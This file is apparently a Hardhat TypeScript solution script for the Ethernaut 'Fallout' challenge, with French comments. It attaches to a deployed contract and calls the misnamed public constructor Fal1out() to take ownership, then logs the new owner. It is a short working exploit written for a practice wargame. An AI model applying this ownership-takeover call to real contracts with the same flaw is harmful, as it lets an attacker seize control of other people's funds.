import { ethers } from "hardhat";
import { Fallout__factory } from "../typechain/factories/Exercise2/Fal1out.sol/Fallout__factory"


async function main() {

  //1ERE PARTIE
  const [addr1] = await ethers.getSigners();
  console.log("adresse1:"+ addr1.address);
  // const Fallout = await ethers.getContractFactory("Fallout");
  // const fallout = await Fallout.deploy();
  // await fallout.deployed();
  // console.log(`deployed to ${fallout.address}`);
  // const fallbackContract = Fallout__factory.connect(fallout.address,addr1)
  


  const deployedAddress = '0x6FFFF9f6ac6828E2b63be1934F89a397d6dC3Ea6';
  const Fallout = await ethers.getContractFactory("Fallout");
  const fallout = await Fallout.attach(deployedAddress);
  await fallout.Fal1out();
  //on aura pu preciser l'adresse : 
  //await fallout.connect(addr1).Fal1out();
  console.log(await fallout.owner());



}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
